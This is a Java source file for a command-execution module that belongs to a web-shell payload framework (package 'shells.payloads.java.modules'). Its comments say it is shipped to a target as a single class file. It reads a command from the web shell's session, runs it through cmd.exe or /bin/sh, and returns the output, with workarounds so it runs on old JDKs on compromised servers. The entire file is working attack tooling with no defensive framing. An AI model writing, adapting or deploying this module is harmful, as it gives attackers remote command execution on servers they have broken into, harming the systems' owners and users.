package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Map;

/**
 * Module classes are shipped to the target as a *single* class file, so an
 * anonymous Runnable would leave a CommandExecModule$1 that never gets sent
 * (NoClassDefFoundError on the target). The class therefore acts as its own
 * Runnable: a throwaway second instance drains the merged output pipe.
 */
public class CommandExecModule implements Runnable {
    private Map session;
    private Object servletRequest;

    /** Reader-thread state; only the throwaway instance built in executeWithProcessBuilder uses these. */
    private InputStream readerStream;
    private ByteArrayOutputStream readerBuffer;

    public void run() {
        try {
            copyStream(this.readerStream, this.readerBuffer);
        } catch (Exception ignored) {
        }
    }

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String cmdLine = getString("cmdLine");
            if (cmdLine == null || cmdLine.trim().isEmpty()) {
                cmdLine = getString("cmd");
            }
            
            if (cmdLine != null && !cmdLine.trim().isEmpty()) {
                String[] args = buildArgsFromParameters();
                if (args == null || args.length == 0) {
                    args = parseCommandLine(cmdLine);
                }
                
                return executeWithProcessBuilder(args, cmdLine);
            }
            return "Missing cmdLine parameter".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    private byte[] executeWithProcessBuilder(String[] args, String cmdLine) {
        try {
            ArrayList<String> commandList = new ArrayList<String>();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                commandList.add("cmd.exe");
                commandList.add("/c");
                if (args != null && args.length > 0) {
                    for (String arg : args) {
                        if (arg != null) {
                            commandList.add(arg);
                        }
                    }
                } else {
                    commandList.add(cmdLine);
                }
            } else {
                commandList.add("/bin/sh");
                commandList.add("-c");
                if (cmdLine != null && !cmdLine.trim().isEmpty()) {
                    commandList.add(cmdLine);
                } else if (args != null && args.length > 0) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < args.length; i++) {
                        if (args[i] != null) {
                            if (sb.length() > 0) {
                                sb.append(' ');
                            }
                            sb.append(args[i]);
                        }
                    }
                    commandList.add(sb.toString());
                } else {
                    commandList.add("");
                }
            }
            
            ProcessBuilder processBuilder = new ProcessBuilder(commandList);
            // Merge stderr into stdout: one pipe to drain, so the reader can
            // never deadlock against an unread stderr buffer.
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            final ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            CommandExecModule reader = new CommandExecModule();
            reader.readerStream = process.getInputStream();
            reader.readerBuffer = outBuf;
            Thread tOut = new Thread(reader, "exec-stdout");
            tOut.setDaemon(true);
            tOut.start();

            // JDK 1.6: Process.waitFor(long, TimeUnit) and destroyForcibly() are Java 8 only.
            long deadline = System.currentTimeMillis() + 120000L;
            boolean finished = false;
            while (System.currentTimeMillis() < deadline) {
                try {
                    process.exitValue();
                    finished = true;
                    break;
                } catch (IllegalThreadStateException notYet) {
                    try { Thread.sleep(100L); } catch (InterruptedException ignored) { break; }
                }
            }
            if (!finished) {
                process.destroy();
                return "timeout: process did not exit in 120s".getBytes();
            }
            try { tOut.join(5000L); } catch (InterruptedException ignored) {}
            byte[] outputBytes = outBuf.toByteArray();

            return outputBytes != null ? outputBytes : new byte[0];
            
        } catch (Exception e) {
            return ("ProcessBuilder error: " + e.getMessage()).getBytes();
        }
    }
    
    private String[] parseCommandLine(String cmdLine) {
        return cmdLine.trim().split("\\s+");
    }

    private String[] buildArgsFromParameters() {
        String argsCountString = getString("argsCount");
        if (argsCountString == null || argsCountString.trim().isEmpty()) {
            return null;
        }
        int argsCount = Integer.parseInt(argsCountString.trim());
        if (argsCount <= 0) {
            return null;
        }

        ArrayList<String> args = new ArrayList<String>();
        for (int i = 0; i < argsCount; i++) {
            String arg = getString(String.format("arg-%d", i));
            if (arg != null) {
                args.add(arg);
            }
        }

        return args.toArray(new String[0]);
    }
    
    private byte[] readStream(InputStream stream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        copyStream(stream, buffer);
        return buffer.toByteArray();
    }

    private void copyStream(InputStream stream, ByteArrayOutputStream buffer) throws Exception {
        byte[] data = new byte[4096];
        int bytesRead;
        while ((bytesRead = stream.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, bytesRead);
        }
    }
    
    public String getModuleName() {
        return "execCommand";
    }
}
